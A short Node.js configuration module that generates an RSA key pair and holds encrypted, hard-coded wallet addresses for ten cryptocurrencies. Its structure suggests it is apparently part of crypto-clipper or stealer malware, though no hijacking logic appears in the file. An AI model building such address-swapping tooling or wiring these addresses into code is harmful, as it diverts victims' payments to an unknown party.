module.exports = (client) => {
    return {
        default_padding: client.requires.crypto.constants.RSA_PKCS1_OAEP_PADDING,
        default_oaepHash: "sha256",
        keyPair: client.requires.crypto.generateKeyPairSync("rsa", {
            modulusLength: 2048,
        }),

        btc: client.utils.encryption.encryptData("1ARnEoEj8WELxP8R3Swu6UH9nm6ML8jhp4"),
        ltc: client.utils.encryption.encryptData("LiGRaDEo8ovmtZ22dqASjEuJG5k6s9AExy"),
        xmr: client.utils.encryption.encryptData("43qGVZWJp97TaikVjz4DwmRiqowHGkgGfKQsBaDNZ2ifFFawneE4wXf58mH2SNhvTQVDm9E16ghtuYUM2Jdufdr86ZsySeZ"),
        eth: client.utils.encryption.encryptData("0x083FC023aA35B92754a52EB3A4f372EeDFB63FDD"),
        xrp: client.utils.encryption.encryptData("rDGDwn57vZMaxsHyM9Ngga4fLRssfQH47N"),
        neo: client.utils.encryption.encryptData("Ne94h6ehAHM8pWCTNCvXWn7tGfa12YcBNX"),
        bch: client.utils.encryption.encryptData("qz85ap59g6zc8k7d4r22jru4h7dumm6xwgjjquc42j"),
        doge: client.utils.encryption.encryptData("D66Mwzp5USMwpg93jYvRasvzRQZhxbpkt4"),
        dash: client.utils.encryption.encryptData("XuGNbN7m2NnbpiReNhXYpvoJiz11hCxRpS"),
        xlm: client.utils.encryption.encryptData("GB4KOM7PRWWWAQZWRFINGZDMM7AMSKZTDZVQERHFRN4ZUCOOMVZMGIFX"),
    }
}